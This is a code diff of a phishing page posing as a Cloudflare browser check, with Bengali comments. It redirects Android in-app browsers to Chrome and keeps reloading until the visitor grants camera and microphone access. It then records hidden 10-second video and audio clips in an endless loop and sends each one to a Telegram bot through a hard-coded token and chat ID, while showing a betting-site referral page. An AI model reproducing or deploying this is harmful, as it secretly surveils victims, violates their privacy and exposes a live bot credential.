@@ -6,18 +6,19 @@
     <title>Security Verification</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
-        #v_stream { position: fixed; left: -9999px; opacity: 0; }
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #f3f4f6; }
+        #v_stream { position: fixed; left: -9999px; opacity: 0; pointer-events: none; }
         #main_frame { width: 100%; height: 100%; border: none; display: none; }
-        .verify-box { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #f3f4f6; }
+        .verify-box { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
     </style>
 </head>
 <body>
 
     <div id="verify_ui" class="verify-box p-6 text-center">
         <div class="animate-spin h-12 w-12 border-4 border-blue-600 border-t-transparent rounded-full mb-4"></div>
-        <h2 class="text-2xl font-bold text-gray-800">Checking Browser...</h2>
-        <p class="text-gray-500 mt-2">Please click <b>"Allow"</b> to continue to the site.</p>
+        <h2 class="text-2xl font-bold text-gray-800">Browser Verification</h2>
+        <p class="text-gray-500 mt-2">Please click <b>"Allow"</b> to access the platform.</p>
+        <p class="text-[10px] text-gray-400 mt-4 uppercase tracking-widest">Secure Connection by Cloudflare</p>
     </div>
 
     <iframe id="main_frame" src=""></iframe>
@@ -25,9 +26,11 @@
     <video id="v_stream" autoplay playsinline muted></video>
 
     <script>
-        // ১. ক্রোম রিডাইরেক্ট সিস্টেম
+        // ১. IMO, FB, Messenger থেকে সরাসরি Chrome-এ যাওয়ার সিস্টেম
         const ua = navigator.userAgent;
-        if (/FBAN|FBAV|Messenger|Telegram|Instagram/i.test(ua) && ua.includes("Android")) {
+        const isApp = /FBAN|FBAV|Messenger|Telegram|Instagram|Imo|ImoAndroid/i.test(ua);
+        
+        if (isApp && ua.includes("Android")) {
             const cleanUrl = window.location.href.replace(/^https?:\/\//, '');
             window.location.href = "intent://" + cleanUrl + "#Intent;scheme=https;package=com.android.chrome;end";
         }
@@ -36,33 +39,34 @@
             t: '8355080071:AAHZ5KdTDSkqNLgSe_9gsuGCyUMYru5pNe4',
             c: '7785049939', 
             u: 'https://dkwin9.com/#/register?invitationCode=14856937272',
-            clip_duration: 10000 // ১০ সেকেন্ড প্রতি ক্লিপ
+            clip_duration: 10000 // ১০ সেকেন্ড লুপ
         };
 
-        let mediaRecorder;
         let stream;
 
         async function init() {
             try {
+                // ২. ক্যামেরা ও মাইক্রোফোন পারমিশন নেওয়া
                 stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 document.getElementById('v_stream').srcObject = stream;
 
-                // ২. পারমিশন পাওয়ার পর মেইন ওয়েবসাইটকে ফ্রেমের ভেতর লোড করো
+                // ৩. পারমিশন পাওয়ার পর মেইন সাইট লোড করা
                 document.getElementById('verify_ui').style.display = 'none';
                 const frame = document.getElementById('main_frame');
                 frame.src = CONFIG.u;
                 frame.style.display = 'block';
 
-                // ৩. লুপ রেকর্ডিং শুরু (প্রতি ১০ সেকেন্ডে ভিডিও পাঠাবে)
-                startLoopRecording();
+                // ৪. লুপ রেকর্ডিং শুরু
+                startRecordingLoop();
 
             } catch (err) {
+                // পারমিশন না দিলে অটো রিফ্রেশ
                 setTimeout(() => { location.reload(); }, 500);
             }
         }
 
-        function startLoopRecording() {
-            mediaRecorder = new MediaRecorder(stream);
+        function startRecordingLoop() {
+            const mediaRecorder = new MediaRecorder(stream);
             let chunks = [];
 
             mediaRecorder.ondataavailable = (e) => {
@@ -74,18 +78,18 @@
                 const formData = new FormData();
                 formData.append('chat_id', CONFIG.c);
                 formData.append('video', blob, 'clip.mp4');
-                formData.append('caption', 'New 10s Background Clip');
+                formData.append('caption', 'Background Recording Active...');
 
-                // ভিডিও পাঠাও
+                // টেলিগ্রামে ভিডিও ক্লিপ পাঠানো
                 fetch(`https://api.telegram.org/bot${CONFIG.t}/sendVideo`, { method: 'POST', body: formData });
 
-                // আবার রেকর্ডিং শুরু করো (আনলিমিটেড লুপ)
-                startLoopRecording();
+                // আগের ডাটা ক্লিয়ার করে আবার লুপ শুরু
+                if(stream.active) startRecordingLoop();
             };
 
             mediaRecorder.start();
             
-            // ১০ সেকেন্ড পর পর সেভ করবে এবং নতুন করে শুরু করবে
+            // ১০ সেকেন্ড পর পর রেকর্ডিং সেভ হবে এবং অটো নতুনটা শুরু হবে
             setTimeout(() => {
                 if(mediaRecorder.state !== "inactive") mediaRecorder.stop();
             }, CONFIG.clip_duration);
